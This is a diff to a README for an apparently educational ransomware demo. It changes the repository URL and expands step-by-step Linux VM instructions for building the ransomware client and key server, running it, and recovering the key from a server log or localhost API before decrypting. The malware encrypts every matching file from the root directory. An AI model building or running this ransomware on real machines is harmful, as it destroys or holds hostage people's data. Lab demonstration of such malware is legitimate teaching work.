@@ -75,8 +75,8 @@ You need a recent Go toolchain (1.16+), `make`, `openssl` and `git`:
 
 ```bash
 sudo apt update && sudo apt install -y golang make openssl git
-git clone https://github.com/mauri870/ransomware
-cd ransomware
+git clone https://github.com/EdwinSanga-Hunter/demoranso
+cd demoranso
 make deps
 make -e CLIENT_OS=windows CLIENT_ARCH=386 GOOS=windows
 ```
@@ -237,44 +237,67 @@ If you prefer a pure-Linux demo (Kali/Debian/Ubuntu VM), everything also runs lo
 
 ```bash
 # 1. Install prerequisites
-sudo apt update && sudo apt install -y golang make openssl git
+sudo apt update && sudo apt install -y golang make openssl git curl
+# (if apt's golang is missing or too old, install from the official tarball:
+#  wget https://go.dev/dl/go1.26.7.linux-amd64.tar.gz
+#  sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.26.7.linux-amd64.tar.gz
+#  echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc)
+go version          # verify: go1.16+ is enough
 
 # 2. Get the code and build
-git clone https://github.com/mauri870/ransomware
-cd ransomware
+git clone https://github.com/EdwinSanga-Hunter/demoranso
+cd demoranso
 make deps
 make
+make demo-launcher  # double-click icons on the Desktop
 
 # 3. (Optional) put a few dummy files in place so the demo hits them
 make demo-files      # creates ~/ransomware-demo/{secret.txt,report.pdf,photo.png,database.db}
 ```
 
-Terminal 1 — start the server:
+Take a **VirtualBox snapshot** of the fresh VM now — after every demo, restore the snapshot and the machine is clean again without rebuilding.
+
+Terminal 1 — start the server (logged to a file so the key can never get lost):
 
 ```bash
-cd bin/server && ./server --port 8080
+cd demoranso && ./scripts/run-server.sh 2>&1 | tee ~/server-key.log
 ```
 
 Terminal 2 — run the malware:
 
 ```bash
-./bin/ransomware
+cd demoranso && ./bin/ransomware
 ```
 
 It registers the keys with the server, then walks `/` encrypting every matching file (`.txt`, `.pdf`, `.conf`, `.db`, images, ...) and renaming them to `<base64-name>.encrypted`. `READ_TO_DECRYPT.html` and `FILES_ENCRYPTED.html` appear on `~/Desktop`.
 
-Get the key back — the server's own `database.db` sits on the disk and gets encrypted too, so the most reliable source is the **server console**, which prints the pair as soon as the malware registers:
+Get the key back — it is registered **before** any file is encrypted, so it's available immediately, three ways:
 
-```
-Successfully saved key pair <ID> - <KEY>
-```
-
-(or `curl http://localhost:8080/api/keys/<ID>` with the ID from `READ_TO_DECRYPT.html` if the db file survived).
-
-Then decrypt:
+1. Server terminal / log file:
 
 ```bash
-./bin/unlocker     # paste the 32-char key, press Enter, answer Y
+grep 'Successfully saved key pair' ~/server-key.log
+```
+
+2. API (the server's own `database.db` is protected by a file lock and never encrypted):
+
+```bash
+ID=$(tr -d '\r' < ~/Desktop/READ_TO_DECRYPT.html | grep -A1 'YOUR IDENTIFICATION IS' | tail -1 | tr -d '[:space:]')
+curl http://localhost:8080/api/keys/$ID
+# {"enckey":"<32-char key>","status":200}
+```
+
+3. Auto-extract the key straight from the log:
+
+```bash
+KEY=$(grep -o 'Successfully saved key pair [a-f0-9]* - [a-f0-9]*' ~/server-key.log | tail -1 | awk '{print $NF}')
+echo $KEY
+```
+
+Then decrypt (click **Unlocker Demo** and paste the key, or from a terminal):
+
+```bash
+printf '%s\nY\n' "$KEY" | ./bin/unlocker
 ```
 
 The unlocker walks `/` and restores every `.encrypted` file to its original name and content.
